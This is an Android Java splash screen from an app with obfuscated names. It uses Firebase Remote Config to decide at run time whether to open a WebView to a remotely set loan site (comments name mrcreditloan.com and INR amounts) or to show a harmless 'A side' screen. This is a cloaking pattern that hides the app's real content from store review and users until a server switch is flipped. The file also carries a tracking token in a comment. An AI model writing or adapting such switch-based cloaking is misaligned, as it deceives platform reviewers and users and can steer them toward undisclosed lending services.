package com.ajforoe.ckofosolet1;

import static com.ajforoe.ckofosolet1.MyApp2.AdjustToken;
import static com.ajforoe.ckofosolet1.Web1Activity.brzvoelz28_url;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.adjust.sdk.Adjust;
import com.adjust.sdk.AdjustConfig;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

public class SplashActivity extends AppCompatActivity {
    Context context;
    String TAG = "SplashActivity";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.splash);
//        RelativeLayout relativeLayout = new RelativeLayout(this);
//        ProgressBar progressBar = new ProgressBar(this);
//        RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(200, 200);
//        layoutParams.addRule(RelativeLayout.CENTER_IN_PARENT);
//
//        relativeLayout.addView(progressBar, layoutParams);
        /// setContentView(relativeLayout);
        context = this;
        //跳转
        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600 * 24 * 40)//2次成功拉取配置时间间隔：20天
                //.setMinimumFetchIntervalInSeconds(0)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        //5个
        mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        try {
                            //applicationId "com.ajforoe.ckofosolet1"
                            //最后一个单词+123456
                            AdjustToken = mFirebaseRemoteConfig.getString("ckofosolet11");//s7dx7agkn9j4


                            if (!TextUtils.isEmpty(AdjustToken)) {
                                //测试：https://www.mrcreditloan.com/mrcash/index1.html
                                //正式：https://www.mrcreditloan.com/dist/index.html
                                brzvoelz28_url = mFirebaseRemoteConfig.getString("ckofosolet12");
                                Web1Activity.brzvoelz28_jsObject = mFirebaseRemoteConfig.getString("ckofosolet13");//Android
                                Web1Activity.brzvoelz28_adjust = mFirebaseRemoteConfig.getString("ckofosolet14");//adjust
                                Web1Activity.brzvoelz28_eventToken = mFirebaseRemoteConfig.getString("ckofosolet15");//eventToken
                                Web1Activity.brzvoelz28_money = mFirebaseRemoteConfig.getString("ckofosolet16");//money
                                Web1Activity.brzvoelz28_INR = mFirebaseRemoteConfig.getString("ckofosolet17");//INR

                                AdjustConfig config = new AdjustConfig(getApplicationContext(), AdjustToken, AdjustConfig.ENVIRONMENT_PRODUCTION);
                                Adjust.onCreate(config);
                                Adjust.onResume();
                                Log.d(TAG, "adjust_key: " + AdjustToken);
                                Log.d(TAG, "app_url: " + brzvoelz28_url);

                                Toast.makeText(context,
                                        "adjust_key: " + AdjustToken + ",app_url: " + brzvoelz28_url + "", Toast.LENGTH_LONG).show();
                                //先不做归因，直接接口返回有值，就跳转；没值就A面
                                Intent intent = new Intent(context, Web1Activity.class);
                                startActivity(intent);
                                finish();
                            } else {
                                Intent intent = new Intent(context, MainActivity.class);
                                startActivity(intent);
                                finish();
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });
    }
}
